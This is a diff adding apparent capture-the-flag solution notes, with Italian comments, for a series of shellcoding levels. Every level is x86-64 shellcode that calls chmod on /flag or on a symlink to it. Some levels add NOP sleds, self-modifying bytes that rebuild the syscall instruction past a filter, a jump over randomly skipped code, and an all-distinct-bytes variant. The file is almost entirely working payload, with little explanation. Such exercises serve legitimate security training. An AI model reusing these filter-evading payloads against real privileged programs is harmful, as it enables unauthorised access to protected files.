@@ -1,0 +1,126 @@
+### base: che funziona per 1,3,4,7,8,10,11 senza modifiche: 
+
+push 0x{flag}
+push rsp
+pop rdi
+
+push 6 
+pop rsi
+
+push 0x5a
+pop rax
+syscall
+
+
+### livello 2: 
+
+.rept 2048 
+nop 
+.endr
+push 0x{flag}
+push rsp
+pop rdi
+
+push 6 
+pop rsi
+
+push 0x5a
+pop rax
+syscall
+
+### livello 5
+
+push 0x{flag}
+push rsp
+pop rdi
+
+push 6 
+pop rsi
+
+push 0x5a
+pop rax
+
+inc BYTE PTR [rip] ## vado a incrementare 1 byte sull'instuction pointer
+.byte 0x0e
+.byte 0x05
+
+### livello 6
+
+.rept 4096
+nop
+.endr
+push 0x{flag}
+push rsp
+pop rdi
+
+push 6 
+pop rsi
+
+push 0x5a
+pop rax
+
+inc BYTE PTR [rip]
+.byte 0x0e
+.byte 0x05
+
+
+
+### livello 9, qui il livello skippa porzioni randomiche di codice
+push 0x{flag}
+push rsp
+pop rdi
+jmp daje
+
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+
+daje:
+    push 6
+    pop rsi
+
+    push 0x5a
+    pop rax
+    syscall
+
+
+
+
+
+### livello 12, qui tutti i bytes devono essere diversi, 
+
+push 0x{flag}
+push rsp
+pop rdi
+
+mov sil, 6
+
+push 0x5a
+pop rax
+syscall
+
+
+
+
+
+### livello 13 
+
+# Create a symlink in command line, `ln -s /flag f`
+# 0x66 is 'f'
+shellcode = f'''
+push 0x66
+push rsp
+pop rdi
+
+mov sil, 7
+mov al, 90
+syscall
+'''
